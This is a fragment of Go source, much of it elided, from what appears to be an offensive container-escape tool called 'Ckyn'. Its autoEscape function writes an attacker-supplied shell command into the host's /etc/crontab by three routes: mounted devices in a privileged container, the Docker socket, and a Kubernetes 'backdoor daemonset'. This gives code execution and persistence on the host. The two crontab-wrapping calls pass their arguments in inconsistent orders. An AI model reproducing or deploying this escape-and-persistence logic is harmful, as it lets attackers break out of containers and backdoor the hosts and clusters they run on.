...
import (
	"fmt"
	"github.com/Yanxinwu946/Ckyn/pkg/exploit/escaping"
	"github.com/Yanxinwu946/Ckyn/pkg/exploit/persistence"
	"log"

	"github.com/Yanxinwu946/Ckyn/conf"
...
func autoEscape(shellCommand string) bool {
	...
	if isPrivContainer {
		...
		if err != nil {
			...
			for _, mountedDir := range mountedDirs {
				...
				err := util.WriteShellcodeToCrontab("# Ckyn auto exploit via mounted device in privileged container", crontabDir, shellCommand)
				if err != nil {
					log.Println(err)
				} else {
	...
	crontabCMD := wrapShellCMDWithCrontab("/host/etc/crontab", shellCommand, "# Ckyn auto exploit via docker.sock")
	...
	if !k8sExploit {
		...
		if err != nil {
			...
			// write shellcode to host /etc/crontab via mounted dir
			crontabCMD := wrapShellCMDWithCrontab("# Ckyn auto exploit via K8s backdoor daemonset", "/host-root/etc/crontab", shellCommand)
